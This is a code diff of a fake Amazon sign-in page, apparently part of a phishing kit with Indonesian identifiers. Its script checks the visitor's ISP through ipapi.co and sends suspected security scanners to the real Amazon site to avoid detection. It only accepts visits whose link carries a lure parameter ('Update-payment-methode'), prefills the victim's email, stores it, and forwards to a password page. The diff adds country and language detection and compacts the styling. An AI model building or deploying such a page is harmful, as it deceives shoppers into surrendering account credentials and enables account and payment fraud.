@@ -4,230 +4,109 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Amazon — Sign In</title>
+    <script src="negara.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Amazon Ember', Arial, sans-serif;
-        }
-        body {
-            background: #ffffff;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 15px 20px;
-        }
-        .logo {
-            margin: 10px 0 25px;
-        }
-        .logo img {
-            height: 35px;
-        }
-        .kotak {
-            width: 100%;
-            max-width: 348px;
-            padding: 20px 26px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            background: #fff;
-        }
-        .kotak h1 {
-            font-size: 28px;
-            font-weight: 400;
-            margin-bottom: 15px;
-        }
-        .label {
-            font-weight: 700;
-            font-size: 13px;
-            margin: 0 0 6px;
-            display: block;
-        }
-        .input {
-            width: 100%;
-            padding: 7px 10px;
-            border: 1px solid #a6a6a6;
-            border-radius: 4px;
-            font-size: 15px;
-            height: 32px;
-            margin-bottom: 20px;
-            outline: none;
-        }
-        .input:focus {
-            border-color: #007185;
-            box-shadow: 0 0 0 2px #c8f0f4;
-        }
-        .tombol {
-            width: 100%;
-            padding: 6px 10px;
-            background: #ffd814;
-            border: 1px solid #fcd200;
-            border-radius: 8px;
-            font-size: 14px;
-            height: 40px;
-            cursor: pointer;
-            margin-bottom: 20px;
-        }
-        .tombol:disabled {
-            background: #e9e9e9;
-            border-color: #ccc;
-            cursor: not-allowed;
-        }
-        .syarat {
-            font-size: 12px;
-            line-height: 1.5;
-            margin-bottom: 25px;
-        }
-        .syarat a {
-            color: #0066c0;
-            text-decoration: none;
-        }
-        .bantuan {
-            font-size: 13px;
-            margin-bottom: 25px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid #e7e7e7;
-        }
-        .bantuan a {
-            color: #0066c0;
-            text-decoration: none;
-        }
-        .bisnis {
-            font-size: 13px;
-        }
-        .bisnis strong {
-            display: block;
-            margin-bottom: 5px;
-        }
-        .bisnis a {
-            color: #0066c0;
-            text-decoration: none;
-        }
-        .bawah {
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px solid #e7e7e7;
-            width: 100%;
-            max-width: 100%;
-            text-align: center;
-            font-size: 11px;
-            color: #555;
-        }
-        .bawah a {
-            color: #0066c0;
-            text-decoration: none;
-            margin: 0 8px;
-        }
-        .pesan {
-            color: #d00;
-            font-size: 12px;
-            margin-bottom: 10px;
-            display: none;
-        }
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Amazon Ember',Arial,sans-serif}
+        body{background:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:15px 20px}
+        .logo{margin:10px 0 25px}
+        .logo img{height:35px}
+        .kotak{width:100%;max-width:348px;padding:20px 26px;border:1px solid #ddd;border-radius:8px;background:#fff}
+        h1{font-size:28px;font-weight:400;margin-bottom:15px}
+        label{font-weight:700;font-size:13px;margin:0 0 6px;display:block}
+        .input{width:100%;padding:7px 10px;border:1px solid #a6a6a6;border-radius:4px;font-size:15px;height:32px;margin-bottom:20px;outline:none}
+        .input:focus{border-color:#007185;box-shadow:0 0 0 2px #c8f0f4}
+        .tombol{width:100%;padding:6px;background:#ffd814;border:1px solid #fcd200;border-radius:8px;font-size:14px;height:40px;cursor:pointer;margin-bottom:20px}
+        .tombol:disabled{background:#e9e9e9;border-color:#ccc;cursor:not-allowed}
+        .syarat{font-size:12px;line-height:1.5;margin-bottom:25px}
+        .syarat a{color:#0066c0;text-decoration:none}
+        .bantuan{font-size:13px;margin-bottom:25px;padding-bottom:15px;border-bottom:1px solid #e7e7e7}
+        .bantuan a{color:#0066c0;text-decoration:none}
+        .bisnis{font-size:13px}
+        .bisnis strong{display:block;margin-bottom:5px}
+        .bisnis a{color:#0066c0;text-decoration:none}
+        .bawah{margin-top:30px;padding-top:20px;border-top:1px solid #e7e7e7;width:100%;max-width:100%;text-align:center;font-size:11px;color:#555}
+        .bawah a{color:#0066c0;text-decoration:none;margin:0 8px}
+        .pesan{color:#d00;font-size:12px;margin-bottom:10px;display:none}
     </style>
 </head>
 <body>
     <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
-    
     <div class="kotak">
         <h1>Sign in or create account</h1>
-        
-        <label class="label" for="email">Enter mobile number or email</label>
+        <label for="email">Enter mobile number or email</label>
         <input type="text" id="email" class="input">
-        
         <p id="pesan" class="pesan"></p>
-        
         <button id="lanjut" class="tombol" disabled>Continue</button>
-        
         <p class="syarat">By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>
-        
         <p class="bantuan"><a href="#">Need help?</a></p>
-        
         <div class="bisnis">
             <strong>Buying for work?</strong>
             <a href="#">Create a free business account</a>
         </div>
     </div>
-    
     <div class="bawah">
-        <p>
-            <a href="#">Conditions of Use</a>
-            <a href="#">Privacy Notice</a>
-            <a href="#">Help</a>
-        </p>
-        <p style="margin-top:8px; color:#767676;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
+        <p><a href="#">Conditions of Use</a> <a href="#">Privacy Notice</a> <a href="#">Help</a></p>
+        <p style="margin-top:8px;color:#767676">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
     </div>
 
 <script>
-// === PENGATURAN ===
 const linkBot = localStorage.getItem('link_bot') || 'https://www.amazon.com';
-const blockISP = (localStorage.getItem('block_isp') || '').split('\n').map(s => s.trim().toLowerCase()).filter(Boolean);
-const whiteISP = (localStorage.getItem('white_isp') || '').split('\n').map(s => s.trim().toLowerCase()).filter(Boolean);
+const blockISP = (localStorage.getItem('block_isp') || '').split('\n').map(s=>s.trim().toLowerCase()).filter(Boolean);
+const whiteISP = (localStorage.getItem('white_isp') || '').split('\n').map(s=>s.trim().toLowerCase()).filter(Boolean);
 const paramNama = localStorage.getItem('param_nama') || 'Update-payment-methode';
-
-// === CEK PARAMETER TAUTAN ===
 const queryStr = window.location.search.substring(1);
 const validParam = queryStr.includes(paramNama);
 
-// === CEK ISP ===
 async function cekISP() {
     try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
         const isp = (data.org || data.isp || '').toLowerCase();
-        
         const isBlocked = blockISP.some(b => isp.includes(b));
         const isWhitelisted = whiteISP.some(w => isp.includes(w));
         
         if (isWhitelisted) {
-            localStorage.setItem('stat_human', parseInt(localStorage.getItem('stat_human') || 0) + 1);
+            localStorage.setItem('stat_human', parseInt(localStorage.getItem('stat_human')||0)+1);
         } else if (isBlocked) {
-            localStorage.setItem('stat_bot', parseInt(localStorage.getItem('stat_bot') || 0) + 1);
-            localStorage.setItem('stat_total', parseInt(localStorage.getItem('stat_total') || 0) + 1);
+            localStorage.setItem('stat_bot', parseInt(localStorage.getItem('stat_bot')||0)+1);
+            localStorage.setItem('stat_total', parseInt(localStorage.getItem('stat_total')||0)+1);
             window.location.href = linkBot;
             return false;
         } else {
-            localStorage.setItem('stat_human', parseInt(localStorage.getItem('stat_human') || 0) + 1);
+            localStorage.setItem('stat_human', parseInt(localStorage.getItem('stat_human')||0)+1);
         }
-        localStorage.setItem('stat_total', parseInt(localStorage.getItem('stat_total') || 0) + 1);
+        localStorage.setItem('stat_total', parseInt(localStorage.getItem('stat_total')||0)+1);
     } catch (e) {
-        localStorage.setItem('stat_human', parseInt(localStorage.getItem('stat_human') || 0) + 1);
-        localStorage.setItem('stat_total', parseInt(localStorage.getItem('stat_total') || 0) + 1);
+        localStorage.setItem('stat_human', parseInt(localStorage.getItem('stat_human')||0)+1);
+        localStorage.setItem('stat_total', parseInt(localStorage.getItem('stat_total')||0)+1);
     }
     return true;
 }
 
-// === MULAI ===
 async function mulai() {
     const boleh = await cekISP();
     if (!boleh) return;
     
+    await mulaiDeteksi(); // Deteksi negara + bahasa
+    
     if (!validParam) {
         document.getElementById('pesan').style.display = 'block';
-        document.getElementById('pesan').textContent = '❌ Tautan tidak valid';
+        const teks = TERJEMAHAN[localStorage.getItem('bahasa')||'en'];
+        document.getElementById('pesan').textContent = teks.salah;
         return;
     }
     
-    // Isi otomatis email dari parameter jika ada
     const cocok = queryStr.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
     if (cocok) document.getElementById('email').value = cocok[0];
     
-    document.getElementById('email').addEventListener('input', cekLengkap);
-    document.getElementById('lanjut').addEventListener('click', lanjutKePassword);
+    document.getElementById('email').addEventListener('input', ()=>{
+        document.getElementById('lanjut').disabled = !document.getElementById('email').value.trim();
+    });
+    document.getElementById('lanjut').addEventListener('click', ()=>{
+        localStorage.setItem('email_pengguna', document.getElementById('email').value.trim());
+        window.location.href = 'password.html';
+    });
 }
-
-function cekLengkap() {
-    const email = document.getElementById('email').value.trim();
-    document.getElementById('lanjut').disabled = !email;
-}
-
-function lanjutKePassword() {
-    const email = document.getElementById('email').value.trim();
-    localStorage.setItem('email_pengguna', email);
-    window.location.href = 'password.html';
-}
-
 mulai();
 </script>
 </body>
